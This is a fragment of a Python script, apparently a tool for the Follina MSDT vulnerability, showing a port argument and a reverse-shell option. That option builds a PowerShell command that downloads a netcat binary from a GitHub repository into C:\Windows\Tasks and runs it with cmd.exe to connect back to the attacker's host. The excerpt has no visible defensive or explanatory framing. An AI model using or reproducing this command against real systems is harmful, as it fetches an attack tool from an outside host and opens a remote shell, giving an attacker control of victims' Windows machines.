...
parser.add_argument(
    ...
    type=int,
    default="80",
    help="port to serve the HTTP server (default: 80)",
)
...
def main(args):
    ...
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/IamVSM/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
